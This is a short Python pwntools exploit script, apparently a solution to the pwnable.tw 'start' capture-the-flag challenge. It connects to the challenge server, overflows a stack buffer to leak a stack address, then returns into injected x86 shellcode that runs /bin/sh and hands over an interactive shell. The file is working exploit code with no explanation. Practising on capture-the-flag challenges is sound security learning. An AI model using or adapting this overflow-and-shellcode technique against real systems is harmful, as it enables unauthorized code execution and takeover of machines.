#!/usr/bin/python3
from pwn import *

r = remote("chall.pwnable.tw", 10000)
#r = process("./start")

gdb_scripts = """
b* 0x08048061
b* 0x08048087
b* 0x0804806c
"""
#gdb.attach(r, gdb_scripts)

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" 
payload = b'A'*20 
payload += p32(0x08048087)

r.sendafter(b'CTF:', payload)

leak_esp = u32(r.recv()[0:4])

payload = b'A'*20
real_esp = leak_esp + 20
payload += p32(real_esp)
payload += shellcode

r.send(payload)

r.interactive()
